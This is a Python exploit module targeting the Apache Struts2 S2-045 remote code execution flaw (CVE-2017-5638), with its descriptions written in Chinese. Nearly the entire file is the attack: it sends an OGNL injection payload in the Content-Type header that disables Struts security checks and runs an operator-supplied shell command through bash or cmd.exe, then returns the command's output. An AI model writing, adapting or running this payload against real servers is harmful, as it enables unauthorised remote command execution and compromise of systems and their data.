#! /usr/bin/env python
# encoding:utf-8
import sys,urllib2

author = ""
scope = "Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10"
description = "Struts2 远程代码执行漏洞"
reference = "cve-2017-5638"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]
def exploit(URL):
    data = '--447635f88b584ab6b8d9c17d04d79918\
    Content-Disposition: form-data; name="image1"\
    Content-Type: text/plain; charset=utf-8\
    \
    x\
    --447635f88b584ab6b8d9c17d04d79918--'

    request = urllib2.Request(URL,data,headers={})
    request.add_header("Content-Length","155")
    request.add_header("User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")
    request.add_header("Content-Type","%{(#zhangsan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}".replace("whoami",sys.argv[2]))
    response = urllib2.urlopen(request)
    return "s2-045 存在利用"

